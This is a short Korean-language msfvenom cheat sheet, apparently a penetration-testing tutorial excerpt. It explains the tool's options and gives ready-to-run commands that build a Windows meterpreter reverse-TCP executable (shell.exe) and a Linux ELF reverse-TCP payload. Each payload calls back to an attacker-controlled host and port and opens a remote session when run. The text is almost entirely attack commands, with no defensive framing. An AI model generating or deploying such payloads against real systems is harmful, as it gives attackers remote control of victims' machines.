```bash
msfvenom -p <payload> LHOST=<공격자 IP> LPORT=<포트> -f <포맷> -o <출력파일>
```

- `-p` : 사용할 페이로드(payload) 선택
- `LHOST` : 리스너 호스트(공격자 IP 주소)
- `LPORT` : 리스너 포트
- `-f` : 출력 포맷(format) 지정 (exe, elf, apk, c, python 등)
- `-o` : 출력 파일 지정

---

### 1. Windows용 Reverse TCP Shell 생성

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe -o shell.exe
```

➡️ `shell.exe` 실행 시 공격자에게 Meterpreter 세션이 연결됨.

### 2. Linux ELF Payload 생성

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f elf -o shell.elf
```
